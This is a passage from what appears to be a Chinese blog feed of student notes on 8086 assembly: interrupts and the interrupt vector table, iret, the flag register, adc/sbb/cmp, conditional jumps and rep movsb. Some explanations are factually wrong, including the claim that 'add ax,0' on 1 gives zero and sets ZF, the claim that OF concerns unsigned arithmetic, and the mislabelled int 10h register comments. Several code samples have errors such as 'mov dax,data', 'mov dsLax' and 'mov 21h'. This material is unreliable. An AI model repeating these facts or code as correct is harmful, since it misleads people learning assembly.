title="4.BIOS和DOS中断例程的安装过程"></a>4.BIOS和DOS中断例程的安装过程</h2><p>int 10H中断例程是bios提供的中段例程，其中包含了多个屏幕输出相关的子程序</p><p>一般来说，一个供程序员调用的中断例程中往往包含多个子程序，中断例程内部用传递进来的参数来决定执行那个子程序</p><p>bios 和 dos 提供的中断例程，都是用ah来传递内部子程序的编号</p><p>int 10H中断例程的设置光标位置功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ah,22号子程序</span><br><span class="line">mov bh,0行号</span><br><span class="line">mov dh,5列号</span><br><span class="line">mov dl,12页数</span><br><span class="line">int 10h</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-内中断（12）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-12-%E5%86%85%E4%B8%AD%E6%96%AD/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-12-%E5%86%85%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>中断：外部终端和内部终端</p><h2 id="1-中断处理程序"><a href="#1-中断处理程序" class="headerlink" title="1.中断处理程序"></a>1.中断处理程序</h2><p>1.CPU的设计者必须在中断信息和其处理程序的入口地址之间建立某种联系，使得COU根据中断信息可以找到要执行的处理程序</p><p>2.中断信息包含有标志中断源的类型码。根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如CPU根据中断类型码4，就可以找到4号的处理程序</span><br></pre></td></tr></table></figure><h2 id="2-中断向量表"><a href="#2-中断向量表" class="headerlink" title="2.中断向量表"></a>2.中断向量表</h2><p>1.CPU中8位的中断类型码，通过中断向量表找到相应的中断处理程序的入口地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">起始就是一个索引</span><br><span class="line">一个类型码有一个对应的地址</span><br></pre></td></tr></table></figure><p>2.中断向量表在内存中存放，对于8086CPU机，中断向量表指定放在内存地址0处</p><p>从内存0000:0000到0000:03ff的1024个内存单元中存放着中断向量表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为什么是1024？</span><br><span class="line">1.一个地址是段地址和偏移地址组成【都是16位，也就是2个字节】</span><br><span class="line">所以一个地址就需要4个字节，一共是8位的中断类型码，也就是有256个中断类型码，所以需要1024个内存单元</span><br></pre></td></tr></table></figure><h2 id="3-中断过程"><a href="#3-中断过程" class="headerlink" title="3.中断过程"></a>3.中断过程</h2><p>1.8086CPU的中断过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.（从中断信息中）取得中断类型码</span><br><span class="line">2.标志寄存器的值入栈【PSW】--用于保护标志位</span><br><span class="line">3.设置标志寄存器的第8位TF和第9位IF的值为0</span><br><span class="line">4.CS的值入栈</span><br><span class="line">5.IP的值入栈</span><br><span class="line">6.从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取处理程序的入口地址，设置IP和CS</span><br></pre></td></tr></table></figure><p>简单点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.取得中断类型码N</span><br><span class="line">2.pushf</span><br><span class="line">3.TF = 0,IF = 0</span><br><span class="line">4.push CS</span><br><span class="line">5.push IP</span><br><span class="line">6.(IP)=(N*4),(CS)=(N*4+2)</span><br><span class="line">取地址的时候，首先取的是偏移地址，在是段地址</span><br></pre></td></tr></table></figure><p>中断处理程序的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.保存用到的寄存器</span><br><span class="line">2.处理中断</span><br><span class="line">3.恢复用到的寄存器</span><br><span class="line">4.用iret指令返回</span><br></pre></td></tr></table></figure><h2 id="4-iret指令的功能"><a href="#4-iret指令的功能" class="headerlink" title="4.iret指令的功能"></a>4.iret指令的功能</h2><p>1.用汇编语法解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.pop IP</span><br><span class="line">2.pop CS</span><br><span class="line">3.popf</span><br><span class="line">恢复之前保护的</span><br></pre></td></tr></table></figure><p>2.iret通常和硬件自动完成的中断过程配合使用</p><h2 id="5-除法错误中断的处理"><a href="#5-除法错误中断的处理" class="headerlink" title="5.除法错误中断的处理"></a>5.除法错误中断的处理</h2><p> 编写一个程序，让发生除法错误中断的时候，在屏幕上输出xxx</p><p>分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.当发生除法溢出的时候，会参数0号中断信息，从而引发中断过程</span><br><span class="line">CPU</span><br><span class="line">取得中断类型：0</span><br><span class="line">标志寄存器入栈，TF和IF设置为0</span><br><span class="line">CS，IP入栈</span><br><span class="line">(IP)=(0*4),(CS)=(0*4+2) //找到中断类型所对应的地址</span><br></pre></td></tr></table></figure><h2 id="6-有一个编程"><a href="#6-有一个编程" class="headerlink" title="6.有一个编程"></a>6.有一个编程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看12.10play</span><br></pre></td></tr></table></figure><h2 id="7-单步中断"><a href="#7-单步中断" class="headerlink" title="7.单步中断"></a>7.单步中断</h2><p>CPU在执行完一条命令后，如果检测到编制寄存器的TF位1，则残生单步中断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说TF=1是产生中断的标志</span><br></pre></td></tr></table></figure><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.取得中断类型码1</span><br><span class="line">2.标志寄存器入栈，TF，IF设置为0</span><br><span class="line">3.CS,IP入栈</span><br><span class="line">4.(IP)=(1*4),(CS)=(1*4+2)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230416214427516.png" alt="image-20230416214427516"></p><h2 id="8-响应中断的特殊情况"><a href="#8-响应中断的特殊情况" class="headerlink" title="8.响应中断的特殊情况"></a>8.响应中断的特殊情况</h2><p>一般情况下，CPU在执行当前指令后，如果检测到中断信息，就响应中断，引发中断过程</p><p>可是在有些情况下，CPU在执行当前指令后，即便是发生中断，也不会响应</p><p>因为某些过程需要连续完成，不能卡在中间，比如ss:sp的设置就不能中断，在完成ss的设置后，即使发送中断CPU也不会中断，sp的设置因该连续完成</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-标志寄存器（11）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-11-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-11-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>1.8086CPU的标志寄存器有16位，其中存储信息通常被称为程序状态字(PSW)</p><p>2.我们已经使用过8086CPU的ax,bx,cx,dx,si,di,bp,sp,ip,cs,ss,ds,es等13个寄存器</p><p>3.本章中的标志寄存器【flag】是我们的最后一个寄存器</p><p>4.flag和其他寄存器不一样，其他寄存器是用存放数据的，都是整个寄存器具有一个含义</p><p>5.而flag寄存器是安位起作用，也就是说：它的每一位都有专门的含义，记录特定的信息</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230414160205653.png" alt="image-20230414160205653"></p><p>6.flag在8086CPU中，只有 0 2 4 6 7 8 9 10 11具有特殊的含义，其他位置都没有意义</p><h2 id="1-ZF标志"><a href="#1-ZF标志" class="headerlink" title="1.ZF标志"></a>1.ZF标志</h2><p>1.flag的第6位是ZF，零标志位，它记录相关指令执行后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">结果为0, ZF=1</span><br><span class="line">结果不为0，ZF=0</span><br></pre></td></tr></table></figure><p>2.比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1执行后结果为0，则ZF=1</span><br><span class="line"></span><br><span class="line">mov ax,2</span><br><span class="line">sub ax,1执行后结果为1，则ZF=0</span><br></pre></td></tr></table></figure><p>3.对于ZF的值，我们可以这样来看，ZF标志相关指令的计算结果是否为0，如果是0，则在ZF要记录下“是0”这样的肯定信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add ax,0</span><br><span class="line">执行后，结果为0，则ZF=1  表示结果是0</span><br></pre></td></tr></table></figure><p>4.我们使用一条指令的时候，要注意这条指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响</p><h2 id="2-PF标志"><a href="#2-PF标志" class="headerlink" title="2.PF标志"></a>2.PF标志</h2><p>1.PE，奇偶标志位。它记录指令执行后，结果的所有二进制位中的1的个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为偶数，PE=1</span><br><span class="line">为奇数，PE=0</span><br></pre></td></tr></table></figure><p>2.比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">addal,10</span><br><span class="line">执行后，结果为00001011B，其中有3个1，则PE=0</span><br><span class="line">mov al,1</span><br><span class="line">or al,10</span><br><span class="line">执行后，结果为00000011B，其中有2个1，则PE=1</span><br></pre></td></tr></table></figure><h2 id="3-SF"><a href="#3-SF" class="headerlink" title="3.SF"></a>3.SF</h2><p>1.flag的第7位是SF，符号标志位，它记录指令执行后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">结果为负SF = 1</span><br><span class="line">结果为正SF = 0</span><br></pre></td></tr></table></figure><h3 id="有符号数和补码-课外知识，得学"><a href="#有符号数和补码-课外知识，得学" class="headerlink" title="有符号数和补码[课外知识，得学]"></a>有符号数和补码[课外知识，得学]</h3><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000001B，可以看作无符号1，或者有符号数+1</span><br><span class="line">10000001B，可以看作无符号数129，或者看作有符号数-127</span><br></pre></td></tr></table></figure><p>2.示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br><span class="line">结果(al)=10000010B</span><br></pre></td></tr></table></figure><p>我们可以将add指令的运算当作无符号数的运算，那么add指令相当于计算129+1，结果是130【10000010B】</p><p>也可以将add指令进行的运算当作有符号的运算，那么add指令相当于计算-127+1，结果为-126【10000010B】</p><p>不管我们如何看待，cpu在执行add等指令的时候，就已经包含了两种含义，也就得到用同一种信息来记录的2中结果</p><p>关键在于我们需要哪一种结果</p><p>3.SF标志，就是CPU对有符号数运算结果的一种记录，它记录数据的正负</p><p>4.CPU在执行add等指令的时候，必然要影响到SF标志位的值</p><p>5.至于需不需要，关键是看我们自己需不需要</p><p>某些指令将影响标志寄存器中的多个标志位，这些被影响的标志位比较全面的记录了指令执行结果，为相关的处理提供了所需的依据，至于需不需要这些结果全都看我们自己</p><h2 id="4-CF标志"><a href="#4-CF标志" class="headerlink" title="4.CF标志"></a>4.CF标志</h2><p>【相对于无符号数而言】</p><p>1.flag的第0位是CF，进位标志位</p><p>2.一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p><p>3.对于位数为N的无符号数来说，其对应的二进制信息的最高位，也就是第N-1位，的最高有限位，而假象存在的第N位，就是相对于最高有效位的更高位</p><p>我们知道，当2个数据相加的时候，可能产生从最高有效位向更高位的进位，这个更高位去哪里了呢？</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230414164826803.png" alt="image-20230414164826803"></p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al;</span><br><span class="line">执行后，al=30H ,cf=1</span><br><span class="line">cf记录了最高有效位向更高位的进位值</span><br></pre></td></tr></table></figure><p>在比如</p><p>两个8位的数据97H-98H，将产生借位，借位后，相当于是197H-98H,,而flag的cf位也可以用来记录这个借位值</p><h2 id="5-OF标志"><a href="#5-OF标志" class="headerlink" title="5.OF标志"></a>5.OF标志</h2><p>【对有符号数而言】</p><p>1.溢出</p><p>在进行有符号运算的时候，如结果超过了机器所能表示的范围称为溢出</p><p>2.什么是机器所能表示的范围？</p><p>add al,3 那么对于8位的有符号数据，机器所能表示的范围就是-128~127</p><p>3.如果我们使用add指令进行的是有符号数运算，则98+99=-59，这样的结果让人无法接受</p><p>造成这种情况的原因，就是实际结果是197，作为一个有符号数，在8位寄存器al中存放不下</p><p>由于在进行有符号数运算的时候，可能发生溢出而造成结果的错误。所以CPU需要对指令执行后是否参数溢出进行记录，从而有了OF</p><h3 id="区别：CF和OF"><a href="#区别：CF和OF" class="headerlink" title="区别：CF和OF"></a>区别：CF和OF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.CF是对无符号数运算有意义的标志位</span><br><span class="line">用CF来记录是否产生了进位</span><br><span class="line"></span><br><span class="line">2.OF是对无符号数运算有意义的标志位</span><br><span class="line">用OF记录是否产生了溢出</span><br><span class="line">用SF来记录结果的符号</span><br></pre></td></tr></table></figure><p>无符号CF有符号PF+SF</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230414175326095.png" alt="image-20230414175326095"></p><h2 id="6-adc指令"><a href="#6-adc指令" class="headerlink" title="6.adc指令"></a>6.adc指令</h2><p>1.adc是带有进位加法指令，它利用了CF上记录的进位值</p><p>2.格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>3.功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">操作对象1=操作对象1+操作对象2+CF</span><br><span class="line">add ax,bx</span><br><span class="line">(ax)=(ax)+(bx)+cf</span><br></pre></td></tr></table></figure><p>4.在执行adc指令的时候加上的cf的值的含义，由adc指令前面的指令决定的，也就是说，关键在于所加上的cf的值是被什么指令设置的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显然，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么就是进位值</span><br></pre></td></tr></table></figure><p>5.我们来看一下两个数据：0198H和0183H如何相加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看出：分2步</span><br><span class="line">1.低位相加；</span><br><span class="line">2.高位相加加上低位相加产生的进位值</span><br></pre></td></tr></table></figure><p>6.和 add ax,bx有相同结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add al,bl</span><br><span class="line">adc ah,bh</span><br></pre></td></tr></table></figure><p>可以看出adc指令的目的就是，进行加法的第二步运算</p><p>adc指令和add指令相配合可以对更大的数据进行运算</p><h3 id="编程小任务"><a href="#编程小任务" class="headerlink" title="编程小任务"></a>编程小任务</h3><p>编程计算1EF000H+201000H，结果放在ax（高16位）和bx（低16位）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,001EH</span><br><span class="line">mov bx,0F000H</span><br><span class="line">add bx,1000H</span><br><span class="line">adc ax,0020H</span><br></pre></td></tr></table></figure><p>adc指令执行后，也可能产生进位值，所以也会对CF位进行设置</p><h2 id="7-sbb指令"><a href="#7-sbb指令" class="headerlink" title="7.sbb指令"></a>7.sbb指令</h2><p>1.sbb是带借位减法指令，它利用了CF位上记录的借位值</p><p>2.格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb操作对象1，操作对象2</span><br></pre></td></tr></table></figure><p>3.功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作对象1=操作对象1-操作对象2-CF</span><br></pre></td></tr></table></figure><p>4..比如：sbb ax，bx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ax)=(ax)-(bx)-CF</span><br></pre></td></tr></table></figure><p>5.利用sbb指令，我们可以对任意大的数据进行剑法运算</p><p>比如：计算003E100OH-00202000H，结果放在ax 和 bx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ax,003EH</span><br><span class="line">sub bx,2000H</span><br><span class="line">sbb ax,0020</span><br></pre></td></tr></table></figure><h2 id="8-cmp指令"><a href="#8-cmp指令" class="headerlink" title="8.cmp指令"></a>8.cmp指令</h2><p>1.cmp是比较指令，功能相当于减法指令，只是不保存结果</p><p>2.cmp指令执行后，将对标志寄存器产生影响</p><p>3.其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果</p><p>4.格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1 - 操作对象2</span><br></pre></td></tr></table></figure><p>5.功能：计算操作对象1-操作对象2，但并不能保存结果，仅仅根据计算结果对标志寄存器进行设置 </p><p>比如：cmp ax,ax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZF=1;PF=1;SF=0;CF=0;OF=0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230415125533748.png" alt="image-20230415125533748"></p><p>6.在使用cmp指令的时候，也包含了2中含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.进行无符号运算</span><br><span class="line">2.进行有符号运算</span><br></pre></td></tr></table></figure><p>对于有符号数的操作，不能说SF=1则操作对象&lt;操作对象2 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(ah)=22H,(bh)=0A0H</span><br><span class="line">则(ah)-(bh)=34-(-96)=130=82H,82Hshi -126的补码，所以SF=1,但是不能说ah&lt;bh</span><br></pre></td></tr></table></figure><p>当产生溢出的时候，就会影响半段</p><p>所以我们就需要一起考虑到溢出的情况，也就是    OF寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.SF=1,OF=0</span><br><span class="line">没有溢出，所以就是小于</span><br><span class="line">2.SF=1,OF=1</span><br><span class="line">有溢出的，所以就是大于</span><br><span class="line">3.SF=0,OF=1</span><br><span class="line">有溢出，所以就是小于</span><br><span class="line">4.SF=0,OF=0</span><br><span class="line">没有溢出，所以就是大于</span><br><span class="line"></span><br><span class="line">总的来说，当有溢出的时候就取反。</span><br></pre></td></tr></table></figure><h2 id="9-检测比较结果的条件转移指令"><a href="#9-检测比较结果的条件转移指令" class="headerlink" title="9.检测比较结果的条件转移指令"></a>9.检测比较结果的条件转移指令</h2><p>1.被cmp指令影响的标志位，这些田间转移指令通常和cmp相配合使用</p><p>cmp指令的比较结果进行转移的指令分为2种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于无符号数的检测</span><br><span class="line">ZF CF</span><br><span class="line">对于有符号数的检测</span><br><span class="line">SF OF ZF</span><br></pre></td></tr></table></figure><p>2.条件转移指令小结【对于无符号】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">je等于则转移ZF=1</span><br><span class="line">jne不等于则转移ZF=0</span><br><span class="line">jb低于则转移CF=1</span><br><span class="line">jnb不低于则转移CF=0</span><br><span class="line">ja高于则转移CF=0,ZF=0</span><br><span class="line">jna不高于则转移CF=1或者ZF=1</span><br></pre></td></tr></table></figure><h3 id="编程训练"><a href="#编程训练" class="headerlink" title="编程训练"></a>编程训练</h3><p>实现如果(ah)=(bh)则(ah)=(ah)+(ah)否则（ah）=（ah）+（bh）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmp ah,bh</span><br><span class="line">je s</span><br><span class="line">add,ah,bh</span><br><span class="line">jmp short ok</span><br><span class="line">s:add ah,ah</span><br><span class="line">ok:ret</span><br></pre></td></tr></table></figure><p>虽然je的含义是相等则转移，但是它进行的操作的是ZF=1则转移</p><p>je检测的是ZF位置，不管je前面是什么指令，只要CPU实现的时候je指令的时候，ZF=1那么就会发生转移</p><h3 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">计算出data段种的8的个数</span><br><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">db 8,11,8,1,8,5,63,38</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov dax,data</span><br><span class="line">mov dsLax</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,0</span><br><span class="line"></span><br><span class="line">s:cmp byte ptr [bx],8</span><br><span class="line">jne next</span><br><span class="line">inc ax</span><br><span class="line"></span><br><span class="line">next:inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-DF标志和串传送指令"><a href="#10-DF标志和串传送指令" class="headerlink" title="10.DF标志和串传送指令"></a>10.DF标志和串传送指令</h2><p>1.flag的第10位是DF，方向标志位</p><p>2.在串 处理指令中，控制每次操作后si和di的增减</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DF=0 , 每次操作后 si di 递增</span><br><span class="line">DF=1 ， 每次操作后 si di 递减 </span><br></pre></td></tr></table></figure><p>3.格式    movsb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">功能（以字节位单位传送）</span><br><span class="line">1.((es)*16+(di))=((ds)*16+(si))</span><br><span class="line">如果DF=0 DF=1 </span><br></pre></td></tr></table></figure><p>4.格式    movsw</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以字来传递</span><br></pre></td></tr></table></figure><p>5.movsb和movsw进行的是串传送操作中第一个不走，一般来说，movsb和movsw都和rep配合使用，格式rep movsb</p><p>rep的作用是根据cx的值，重复执行后面串传送指令</p><p>由于没执行依次movsb si di都会变化，则rep movsb就可以循环实现(cx)个字符的传送</p><p>6.如何修改DF?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cld 将DF设置成0</span><br><span class="line">std 将DF设置成1</span><br></pre></td></tr></table></figure><p>7.练习一手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">db &#x27;welcome to masm!&#x27;</span><br><span class="line">db 16 dup(0)</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov dx,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,16</span><br><span class="line"></span><br><span class="line">mov cx,16</span><br><span class="line"></span><br><span class="line">cld;设置DF=0</span><br><span class="line">rep movsb;1.((es)*16+(di))=((ds)*16+(si))</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">mov 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>11.pushf 和 popf</p><p>1.pushf：将标志寄存器的值压入栈中</p><p>popf：从栈中弹出数据，送入标志寄存器中</p><p>2.pushf和popf，为直接访问标志寄存器提供了一种方法</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-CALL和RET指令（10）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-10-CALL%E5%92%8CRET%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-10-CALL%E5%92%8CRET%E6%8C%87%E4%BB%A4/</url>
      
